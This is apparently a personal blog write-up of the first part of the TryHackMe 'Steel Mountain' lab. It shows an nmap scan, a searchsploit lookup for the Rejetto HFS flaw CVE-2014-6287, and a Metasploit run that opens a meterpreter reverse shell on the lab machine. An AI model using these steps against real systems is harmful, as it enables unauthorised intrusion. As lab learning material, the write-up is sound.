---
layout: post
title:  "Steel Mountain"
date:   2024-02-13 12:50:01 -0600
categories: TryHackMe
image: /assets/img/steel-mountain.jpg
---

[Steel Mountain](https://tryhackme.com/room/steelmountain)
Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

start with nmap scan
```
nmap -sC -sV 10.10.33.96

Starting Nmap 7.60 ( https://nmap.org ) at 2024-02-14 01:58 GMT
Nmap scan report for ip-10-10-33-96.eu-west-1.compute.internal (10.10.33.96)
Host is up (0.00063s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl          Microsoft SChannel TLS
| fingerprint-strings: 
|   TLSSessionReq: 
|     \xb6
|     steelmountain0
|     240213015723Z
|     240814015723Z0
|     steelmountain0
|     Y:>-G
|     ]O`?
|     h/WX=1
|     cyB;CD
|     \x0f
|     $0"0
|     V6mi
|     $`hM
|     \x03
|_    pzu=~
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-02-13T01:57:23
|_Not valid after:  2024-08-14T01:57:23
|_ssl-date: 2024-02-14T02:00:49+00:00; 0s from scanner time.
8080/tcp  open  http         HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.60%I=7%D=2/14%Time=65CC1EA1%P=x86_64-pc-linux-gnu%r(TL
SF:SSessionReq,346,"\x16\x03\x03\x03A\x02\0\0M\x03\x03e\xcc\x1e\x9di\xf7\x
SF:1c\x8f\xd9\x90Z\xc8\xca8\xb0L\xfadQ\xac\xfa\x04\x13Cl\xc4\x97}f\x10>{\x
SF:20\xc2\(\0\0\(\xb1\xf7\xbe\\\xb6\xe7n9\xd0Oo\x8d\xf4\xaaM\xe2\x81!\xc2\
SF:xfcN\xab\xf5O\xfdF\x17\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xe8\0\x02\x
SF:e5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x02\x01\x02\x02\x10\x1c\
SF:xe6R\x9el\xd6\xf8\x8bC\xb4\x91\x81\xefj\xb0\x070\r\x06\t\*\x86H\x86\xf7
SF:\r\x01\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmounta
SF:in0\x1e\x17\r240213015723Z\x17\r240814015723Z0\x181\x160\x14\x06\x03U\x
SF:04\x03\x13\rsteelmountain0\x82\x01\"0\r\x06\t\*\x86H\x86\xf7\r\x01\x01\
SF:x01\x05\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xd9\xbdV\*\x
SF:e4\xce\^\x0f:\xc2\x95e\xeb\x11\x84;\xc72\x16Q\xbf\xaeT\x89\x9a\x0c\xeax
SF:\xd2\xd3\xcf\xf3\xf5\x8f\xf4\x81\*\x01\x98\xa5'\"\xc4\x7f\xd94\xear\xde
SF:\xea\$\xa5O\x82b\xfc\xab6\x82\x93\xadF\xd7o\xd7\xfe\xaf\$\xd3Y\x15\xb2\
SF:xf3<\xcc\x05\xb4\xc4J-Q\x1fe\xfc\x15\xfe\x13\xe5\xff>\x15\x98B5\xa4\xe1
SF:\x0e\xd1\x8f\xa0-\xbb\x8b\]\xa4\x04\x97\n\xe4a\r\x9c\xf2\x80\xdc\x06\x1
SF:5\x94!\x87\x8f&R1\xbe\xf18&\xbec\[\xc2\?\x04Y:>-G\x92\x01I\xdb\x84\x82!
SF:U\x0e\xde\x96\xd0\xe1\]O`\?\xae\xbf/\xa7c\x9b\xae\x85h/WX=1\xda\xac\x1c
SF:EF\xbe\x04\$\|\xad\xc0i\?\[\xeaw\x88\x88M\xb9\r\xb5\x0f\xb0\]\x95\xbf\x
SF:ba\xbb\x86x\x16\xac2\xb9B7\xbc\xbeG\xc9\xf4,\)5\xf5\xf8\x80\x9fcyB;CD\0
SF:=#\xdb\xd5\x13\xfeP\x1f\t\xe9\x9c\xa4\xe9X\xc0\x9e\xe4\x7fA\x11\x1d\xae
SF:\xff\xe0\x1e!\x01\\\x0f\x19\x02\x03\x01\0\x01\xa3\$0\"0\x13\x06\x03U\x1
SF:d%\x04\x0c0\n\x06\x08\+\x06\x01\x05\x05\x07\x03\x010\x0b\x06\x03U\x1d\x
SF:0f\x04\x04\x03\x02\x0400\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\0\x03
SF:\x82\x01\x01\0\x9e\xba;&\xd2\xdc\x9f\xe8\x87\xe1\xcd\|\xc8L\x8c\xce\ng\
SF:xbb\x87\x97N\x9c\xe3x\|\x96~\xad\xe9n\xb2Y%\x8f\$\xc1\xf8fE\xeb\x8f\x80
SF:8\xe4Y\x7f\xd9\xb5\xa7\x18;\xe7\xa7\x83V\xe6\x19\xcf\xa7\x86\xdc\xd0\xa
SF:5\x8a\xc6\xde\$\xdb\x99\xcd\xf3R\xc8z\xcap\t\xaf\xf0m\x20\xf1V6mi\x1a\x
SF:1a\x9b#\x9f\xe2\xfd_\xa6\xf4\xd3\xcd\x08\x18\x1e\$\r\x837N\xd5o\x7f\xfc
SF:@\x02Ir1\xdb\xacz\xf4\xd8D\xbd\xf2\xa7\xdcP\x05x!H\x83\xe1\x8d\$`hM\xf5
SF:'\xf1\xad\)I\xeb\xa6z\xa1\x01\x9c\x9d\x1d\^\x12\^\.\x01\xb7\x88\x20\x0e
SF:\xd7\xe3\xac\x08\x89\x88\*\x02'\xd9\\\x03\xba\xa8~\xe8\xb9\xe7,\x150\xb
SF:3pzu=~\xa9B\x7f\xedJ\x84aFB\xb2VoG\xc1_\xd2\x10\xfb\x16\x12\xd5T\xe94\x
SF:1f\x85\xfc\x89b'\xcc\x04'\xa0O\xf0\xab0\xc0\xdeh/\xaf\x10E\xbc\x9f\x1b\
SF:xca\xa7\xe5\x07\xe3\xc6l;\xd9\xb3\x82\xd3\xb7\^\x8c\x13\[\x9b\x96\xe5\x
SF:0e\0\0\0");
MAC Address: 02:8C:83:92:98:5F (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:8c:83:92:98:5f (unknown)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-14 02:00:49
|_  start_date: 2024-02-14 01:57:14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.41 seconds

```
Port 80 and 8080
Notice:  8080/tcp  open  http         HttpFileServer httpd 2.3

Going to the web url from the AttackBox
Clicking on the HttpFileServer redirects to http://www.rejetto.com/hfs/

```
searchsploit rejetto
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Comma | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Mult | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbi | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command | windows/webapps/49125.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results

```
download to local
```
searchsploit -m windows/webapps/49125.py
  Exploit: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49125
     Path: /opt/exploitdb/exploits/windows/webapps/49125.py
    Codes: CVE-2014-6287
 Verified: False
File Type: Python script, UTF-8 Unicode text executable
Copied to: /root/49125.py
```
Now let's fire up Metasploit

```
msf6 > search 2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec


msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOST 10.10.33.96
RHOST => 10.10.33.96
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.80.244:4444 
[*] Using URL: http://10.10.80.244:8080/DIQ21cTVp4izz
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /DIQ21cTVp4izz
[*] Sending stage (175686 bytes) to 10.10.33.96
[!] Tried to delete %TEMP%\hHRYDl.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.80.244:4444 -> 10.10.33.96:49226) at 2024-02-14 02:22:43 +0000
[*] Server stopped.

meterpreter > 

```
At this point I wanted to stop and make a part II so that I understand what I'm doing